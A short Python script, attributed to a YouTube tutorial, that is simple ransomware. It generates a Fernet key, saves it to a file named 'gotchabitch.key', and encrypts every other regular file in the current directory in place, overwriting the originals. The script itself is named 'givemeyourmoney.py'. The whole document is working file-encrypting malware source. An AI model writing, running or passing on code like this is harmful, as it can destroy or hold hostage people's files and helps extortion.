#!/usr/bin/env python3

"""
This is a script taken from NetworkChuck YouTube channel. It is a simple
python script. See my latest post at https://0x8c.org for more.
"""

import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
    if file == "givemeyourmoney.py" or file == "gotchabitch.key":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

key = Fernet.generate_key()

with open("gotchabitch.key", "wb") as gotchabitch:
    gotchabitch.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)